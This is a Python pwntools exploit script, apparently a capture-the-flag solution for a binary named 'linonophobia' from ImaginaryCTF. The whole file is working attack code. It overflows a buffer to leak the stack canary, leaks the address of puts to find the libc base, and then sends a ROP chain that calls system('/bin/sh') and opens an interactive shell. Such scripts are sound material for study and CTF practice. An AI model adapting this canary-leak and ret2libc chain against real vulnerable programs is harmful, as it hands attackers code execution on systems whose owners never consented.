#!/usr/bin/env python3


from pwn import *


e = ELF("./linonophobia")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
#r = remote("chal.imaginaryctf.org",42006)
r = process("./linonophobia")
rop = ROP(e)
pop_rdi = rop.find_gadget(['pop rdi'])[0]
ret = rop.find_gadget(['ret'])[0]
canary_leaker = b"A" * 264
r.sendline(canary_leaker)
r.recvuntil(canary_leaker)
canary = u64(r.recv()[0:8].decode('latin-1').ljust(8,'\x00')) - 0xa
log.info("The stack canary value is " + hex(canary))
libc_leaker = b'A' * 264 + p64(canary) + b'A' * 8 + p64(pop_rdi) + p64(e.got["puts"]) + p64(e.plt["puts"])  + p64(e.sym["main"])
r.send(libc_leaker)
libc_leak = u64(r.recvuntil(b"\x7f").lstrip(b"\n").decode('latin-1').ljust(8,'\x00'))
log.info("The libc leaked address for puts is " + hex(libc_leak))
r.sendline(b"A" * 20)
libc_base = libc_leak - libc.sym["puts"] #0x0875a0
log.info("The libc base of the process is " + hex(libc_base))
system = libc_base + libc.sym["system"]#0x055410
bin_sh = libc_base + next(libc.search(b"/bin/sh\x00")) #0x1b75aa
rce = b'A' * 264 + p64(canary) + b'A' * 8  + p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(system)
r.sendline(rce)
r.interactive()
r.close()
